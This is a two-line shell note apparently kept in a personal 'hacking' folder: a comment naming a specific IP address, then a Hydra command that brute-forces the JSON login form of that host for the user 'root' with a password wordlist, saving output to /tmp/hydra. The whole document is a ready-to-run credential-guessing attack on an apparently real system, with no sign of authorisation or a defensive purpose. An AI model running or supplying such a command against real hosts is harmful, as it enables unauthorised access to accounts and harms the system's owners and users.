# 188.143.37.178 is costateto
~/workspace/hacking/hydra/hydra -d -V -l root -P ~/workspace/hacking/wordlists/Probable-Wordlists/Real-Passwords/Top207-probable-v2.txt -v 188.143.37.178 https-form-post "/users/login/:{\"userName\"\:\"^USER^\",\"password\"\:\"^PASS^\",\"rememberMe\"\:false}:User 'root' not found!" > /tmp/hydra
